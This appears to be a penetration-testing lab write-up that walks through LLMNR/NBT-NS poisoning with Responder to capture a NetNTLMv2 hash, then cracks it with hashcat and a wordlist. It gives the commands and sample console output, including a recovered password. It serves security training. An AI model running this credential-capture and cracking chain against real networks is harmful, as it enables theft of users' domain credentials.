# Lab 1: Practical LLMNR/NBT-NS Poisoning & Hash Cracking

> **Objective**: Observe real-world console outputs and step-by-step execution for capturing and cracking NetNTLMv2 hashes during an internal network assessment.

---

## 1. Launching Responder on Network Interface

```console
$ sudo responder -I eth0 -dwv

                                         __
  _______  ______ _______ _____  ___ ___/ /__ _______
 / __/ _ \(_-< _ \/ _ \/ _ `/ _ \/ -_) _  / -_) __(_-<
/_/  \___/___/ .__/\___/\_,_/_//_/\__/\_,_/\__/_/ /___/
            /_/

  [+] Poisoners:
      LLMNR                      [ON]
      NBT-NS                     [ON]
      MDNS                       [ON]
      DNS                        [ON]
      DHCP                       [OFF]

  [+] Servers:
      HTTP server                [ON]
      HTTPS server               [ON]
      SMB server                 [ON]
      FTP server                 [ON]
      LDAP server                [ON]
      SQL server                 [ON]

[+] Listening for events...
```

---

## 2. Real-World Captured Authentication Output

When a victim on the subnet types `\\nonexistent-server\share` in Windows Explorer:

```console
[SMB] NTLMv2-SSP Client   : 192.168.1.105
[SMB] NTLMv2-SSP Username : CORP\jdoe
[SMB] NTLMv2-SSP Hash     : jdoe::CORP:1122334455667788:A1B2C3D4E5F60718293A4B5C6D7E8F01:0101000000000000...
[+] Hash saved to: /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.105.txt
```

---

## 3. Cracking NetNTLMv2 Hashes with Hashcat

```console
$ hashcat -m 5600 -a 0 jdoe_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

hashcat (v6.2.6) starting...

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921507
* Keyspace..: 14344384

jdoe::CORP:1122334455667788:A1B2C3D4...:Welcome2024!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: jdoe::CORP:...
Time.Started.....: Thu Nov 20 14:12:01 2026 (2 secs)
Speed.#1.........: 12.4M H/s
Recovered........: 1/1 (100.00%) Digests
```
